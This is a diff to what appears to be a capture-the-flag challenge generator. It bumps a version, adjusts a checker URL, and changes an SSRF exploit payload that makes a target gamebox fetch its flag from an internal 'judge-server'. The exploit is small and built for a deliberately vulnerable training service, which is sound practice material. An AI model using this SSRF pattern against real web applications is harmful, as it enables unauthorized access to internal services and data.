@@ -108,7 +108,7 @@ CMD ["apache2-foreground"]
 fn gamebox_meta_toml(name: &str) -> String {
     format!(
         r#"name = "{name}"
-version = "1.0.0"
+version = "1.0.3"
 author = "your_email"
 category = "web"
 description = "hello floatctf"
@@ -179,7 +179,7 @@ def check(target_ip: str) -> dict:
     result: dict = {"gamebox_ip": target_ip}
     try:
         with urllib.request.urlopen(
-            f"http://{target_ip}/", timeout=CHECK_TIMEOUT_SECS
+            f"http://{target_ip}/?url=http://127.0.0.1", timeout=CHECK_TIMEOUT_SECS
         ) as resp:
             if resp.status == 200:
                 result["success"] = True
@@ -267,7 +267,7 @@ def exploit(target_ip: str) -> dict:
     result: dict = {"gamebox_ip": target_ip}
     # SSRF：目标 GameBox 的 PHP 请求 flagserver/flag，
     # TCP 源 IP = 目标 GameBox → FlagServer 发放目标战队 flag。
-    payload_url = f"http://{target_ip}/?url=http://flagserver/flag"
+    payload_url = f"http://{target_ip}/?url=http://judge-server/flag"
     try:
         with urllib.request.urlopen(payload_url, timeout=EXPLOIT_TIMEOUT_SECS) as resp:
             body = resp.read().decode("utf-8", errors="replace").strip()
